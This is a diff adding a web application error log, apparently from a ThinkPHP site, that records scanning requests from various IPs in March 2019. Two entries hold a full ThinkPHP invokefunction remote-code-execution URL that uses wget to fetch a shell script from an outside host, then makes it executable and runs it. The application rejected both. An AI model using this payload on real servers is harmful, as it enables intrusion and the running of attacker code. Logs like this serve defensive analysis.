@@ -1,0 +1,12 @@
+[ 2019-03-08T02:06:46+08:00 ] 107.181.166.65 /phpmyadmin/
+ERR: 无法加载控制器:Phpmyadmin
+
+[ 2019-03-08T04:42:56+08:00 ] 182.254.241.79 /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=wget%20http://86.105.49.215/a.sh%20-O%20/tmp/a;%20chmod%200777%20/tmp/a;%20/tmp/a;
+ERR: 非法操作:\think\app
+
+[ 2019-03-08T07:07:54+08:00 ] 123.56.49.19 /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=wget%20http://86.105.49.215/a.sh%20-O%20/tmp/a;%20chmod%200777%20/tmp/a;%20/tmp/a;
+ERR: 非法操作:\think\app
+
+[ 2019-03-08T19:20:53+08:00 ] 79.124.56.251 /index.action
+ERR: 无法加载控制器:Index.action
+
